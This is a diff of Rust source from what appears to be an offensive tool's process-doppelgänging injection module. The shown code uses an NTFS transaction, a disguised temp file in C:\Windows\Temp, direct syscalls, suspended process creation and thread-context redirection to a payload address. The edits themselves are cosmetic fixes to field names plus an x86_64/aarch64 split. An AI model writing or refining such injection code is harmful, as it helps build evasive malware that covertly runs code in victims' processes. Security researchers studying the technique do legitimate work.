@@ -389,9 +389,8 @@ unsafe fn create_transacted_file(tx_handle: usize, payload_size: usize) -> Resul
     // This enlists all subsequent file I/O on this thread into the
     // transaction.  The correct NT mechanism — do NOT place the tx handle
     // in OBJECT_ATTRIBUTES.RootDirectory (that is a directory handle field).
-    crate::injection_transacted::set_current_transaction(tx_handle).map_err(|e| {
-        format!("set_current_transaction failed: {}", e)
-    })?;
+    crate::injection_transacted::set_current_transaction(tx_handle)
+        .map_err(|e| format!("set_current_transaction failed: {}", e))?;
 
     // ── Step 2: Build temp file NT path ──────────────────────────────
     // Path: \??\C:\Windows\Temp\~dpgXXXX.tmp  (randomised suffix)
@@ -759,7 +758,7 @@ unsafe fn open_target_process(pid: u32) -> Result<usize, String> {
     client_id[0] = pid as u64;
 
     let mut obj_attr: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
-    obj_attr.length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
+    obj_attr.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
 
     let mut h_proc: usize = 0;
     let status = crate::syscall!(
@@ -847,9 +846,9 @@ unsafe fn create_suspended_process() -> Result<(usize, usize, u32), String> {
         ));
     }
 
-    let pid = proc_info.dw_process_id;
-    let process_handle = proc_info.h_process as usize;
-    let thread_handle = proc_info.h_thread as usize;
+    let pid = proc_info.dwProcessId;
+    let process_handle = proc_info.hProcess as usize;
+    let thread_handle = proc_info.hThread as usize;
 
     tracing::debug!(
         "injection_doppelganging: created suspended process pid={}",
@@ -921,7 +920,7 @@ unsafe fn redirect_thread(thread_handle: usize, payload_addr: usize) -> Result<(
     use crate::win_types::CONTEXT;
 
     let mut ctx: CONTEXT = std::mem::zeroed();
-    ctx.context_flags = crate::win_types::CONTEXT_FULL;
+    ctx.ContextFlags = crate::win_types::CONTEXT_FULL;
 
     // NtGetContextThread(ThreadHandle, pContext)
     let status = crate::syscall!(
@@ -933,7 +932,14 @@ unsafe fn redirect_thread(thread_handle: usize, payload_addr: usize) -> Result<(
         return Err(format!("NtGetContextThread failed: status={:?}", status));
     }
 
-    ctx.rip = payload_addr as u64;
+    #[cfg(target_arch = "x86_64")]
+    {
+        ctx.Rip = payload_addr as u64;
+    }
+    #[cfg(target_arch = "aarch64")]
+    {
+        ctx.Pc = payload_addr as u64;
+    }
 
     // NtSetContextThread(ThreadHandle, pContext)
     let status = crate::syscall!(
